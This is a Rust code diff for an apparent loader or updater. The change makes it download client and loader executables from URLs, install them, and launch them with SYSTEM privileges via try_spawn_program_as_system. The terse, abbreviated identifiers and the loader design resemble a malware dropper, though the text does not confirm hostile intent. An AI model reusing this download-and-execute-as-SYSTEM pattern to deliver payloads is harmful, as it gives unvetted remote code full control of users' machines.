@@ -10,7 +10,7 @@ use shared::{
     network::basic::download_bytes_from_url,
     utils::{
         config::{ load_mib_config, write_mib_config, HstCnfg },
-        functions::generate_random_string,
+        functions::{ generate_random_string, try_spawn_program_as_system },
     },
 };
 
@@ -22,7 +22,7 @@ pub fn run_config(params: RnCnfgPrms) -> Result<()> {
     let mib_config = load_mib_config(true)?;
 
     let mut highest_installed_client_version = 0;
-    for client in mib_config.clnts {
+    for client in &mib_config.clnts {
         if client.version > highest_installed_client_version {
             highest_installed_client_version = client.version;
         }
@@ -31,10 +31,19 @@ pub fn run_config(params: RnCnfgPrms) -> Result<()> {
         if let Some(client_source) = params.cl_src {
             let _ = install_client(client_source, params.cl_vrs);
         }
+    } else {
+        // this means up to date installed or higher installed.
+        // just run
+
+        let highest_client = mib_config.clnts
+            .iter()
+            .max_by_key(|client| client.version)
+            .unwrap();
+        try_spawn_program_as_system(&highest_client.exe_path, None)?;
     }
 
     let mut highest_installed_loader_version = loader_version();
-    for loader in mib_config.ldrs {
+    for loader in &mib_config.ldrs {
         if loader.version > highest_installed_loader_version {
             highest_installed_loader_version = loader.version;
         }
@@ -43,13 +52,22 @@ pub fn run_config(params: RnCnfgPrms) -> Result<()> {
         if let Some(self_source) = params.slf_src {
             let _ = install_self(self_source, params.slf_vrs);
         }
+    } else {
+        // this means up to date installed or higher installed or update disabled
+        // just run current
+
+        let highest_loader = mib_config.ldrs
+            .iter()
+            .max_by_key(|loader| loader.version)
+            .unwrap();
+        try_spawn_program_as_system(&highest_loader.exe_path, None)?;
     }
 
     Ok(())
 }
 fn install_client(source: FlSrc, version: u64) -> Result<()> {
     let bytes = match source {
-        FlSrc::Url(url) => download_bytes_from_url(&url).unwrap_or(Vec::new()),
+        FlSrc::Url(url) => download_bytes_from_url(&url)?,
         FlSrc::Bt(vec) => vec,
     };
     if bytes.is_empty() {
@@ -78,12 +96,14 @@ fn install_client(source: FlSrc, version: u64) -> Result<()> {
 
     write_mib_config(&mib_config)?;
 
+    try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;
+
     Ok(())
 }
 
 fn install_self(source: FlSrc, version: u64) -> Result<()> {
     let bytes = match source {
-        FlSrc::Url(url) => download_bytes_from_url(&url).unwrap_or(Vec::new()),
+        FlSrc::Url(url) => download_bytes_from_url(&url)?,
         FlSrc::Bt(vec) => vec,
     };
     if bytes.is_empty() {
@@ -111,6 +131,8 @@ fn install_self(source: FlSrc, version: u64) -> Result<()> {
     });
 
     write_mib_config(&mib_config)?;
+
+    try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;
 
     Ok(())
 }
